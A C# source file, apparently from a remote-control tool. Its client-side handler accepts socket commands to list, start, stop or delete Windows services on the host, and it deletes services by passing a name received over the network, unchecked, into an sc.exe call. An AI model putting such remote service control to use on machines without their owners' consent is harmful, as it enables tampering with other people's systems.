using System;
using System.Collections.Generic;
using System.Management;
using System.ServiceProcess;
using RemoteControl.Protocals;
using RemoteControl.Protocals.Request;
using RemoteControl.Protocals.Response;

namespace RemoteControl.Client.Handlers
{
    class RequestServiceManagerHandler : AbstractRequestHandler
    {
        public override void Handle(SocketSession session, ePacketType reqType, object reqObj)
        {
            RunTaskThread(() =>
            {
                try
                {
                    var req = reqObj as RequestServiceManager;
                    if (req == null) return;

                    switch (req.Action)
                    {
                        case eServiceAction.List:
                            SendServiceList(session);
                            break;
                        case eServiceAction.Start:
                            StartService(session, req.ServiceName);
                            break;
                        case eServiceAction.Stop:
                            StopService(session, req.ServiceName);
                            break;
                        case eServiceAction.Delete:
                            DeleteService(session, req.ServiceName);
                            break;
                    }
                }
                catch (Exception ex)
                {
                    SendMessage(session, false, ex.Message);
                }
            });
        }

        private void SendServiceList(SocketSession session)
        {
            var services = ServiceController.GetServices();
            var pidMap = new Dictionary<string, int>();
            var descMap = new Dictionary<string, string>();
            var startTypeMap = new Dictionary<string, string>();
            try
            {
                using (var searcher = new ManagementObjectSearcher("SELECT Name, ProcessId, Description, StartMode FROM Win32_Service"))
                {
                    foreach (ManagementObject mo in searcher.Get())
                    {
                        string name = Convert.ToString(mo["Name"]);
                        int pid = Convert.ToInt32(mo["ProcessId"]);
                        string desc = Convert.ToString(mo["Description"]);
                        string startMode = Convert.ToString(mo["StartMode"]);
                        pidMap[name] = pid;
                        if (!string.IsNullOrEmpty(desc)) descMap[name] = desc;
                        if (!string.IsNullOrEmpty(startMode)) startTypeMap[name] = startMode;
                    }
                }
            }
            catch { /* WMI not available, continue without PID/description */ }

            var list = new List<ServiceInfo>();
            foreach (var svc in services)
            {
                using (svc)
                {
                    int pid = 0;
                    pidMap.TryGetValue(svc.ServiceName, out pid);
                    string desc = null;
                    descMap.TryGetValue(svc.ServiceName, out desc);
                    string startType = null;
                    startTypeMap.TryGetValue(svc.ServiceName, out startType);
                    list.Add(new ServiceInfo
                    {
                        ServiceName = svc.ServiceName,
                        DisplayName = svc.DisplayName,
                        Status = svc.Status.ToString(),
                        StartType = startType ?? "",
                        Type = svc.ServiceType.ToString(),
                        PID = pid,
                        Description = desc
                    });
                }
            }

            var resp = new ResponseServiceManager();
            resp.Result = true;
            resp.Services = list;
            session.Send(ePacketType.PACKET_SERVICE_MANAGER_RESPONSE, resp);
        }

        private void StartService(SocketSession session, string serviceName)
        {
            using (var sc = new ServiceController(serviceName))
            {
                if (sc.Status != ServiceControllerStatus.Running)
                {
                    sc.Start();
                    sc.WaitForStatus(ServiceControllerStatus.Running, TimeSpan.FromSeconds(10));
                }
            }
            SendMessage(session, true, "服务 " + serviceName + " 已启动");
        }

        private void StopService(SocketSession session, string serviceName)
        {
            using (var sc = new ServiceController(serviceName))
            {
                if (sc.Status != ServiceControllerStatus.Stopped)
                {
                    sc.Stop();
                    sc.WaitForStatus(ServiceControllerStatus.Stopped, TimeSpan.FromSeconds(10));
                }
            }
            SendMessage(session, true, "服务 " + serviceName + " 已停止");
        }

        private void DeleteService(SocketSession session, string serviceName)
        {
            RemoteControl.Protocals.Utilities.ProcessUtil.Run("sc.exe", "delete \"" + serviceName + "\"", true).Join();
            SendMessage(session, true, "服务 " + serviceName + " 已删除");
        }

        private void SendMessage(SocketSession session, bool result, string message)
        {
            var resp = new ResponseServiceManager();
            resp.Result = result;
            resp.Message = message;
            session.Send(ePacketType.PACKET_SERVICE_MANAGER_RESPONSE, resp);
        }
    }
}
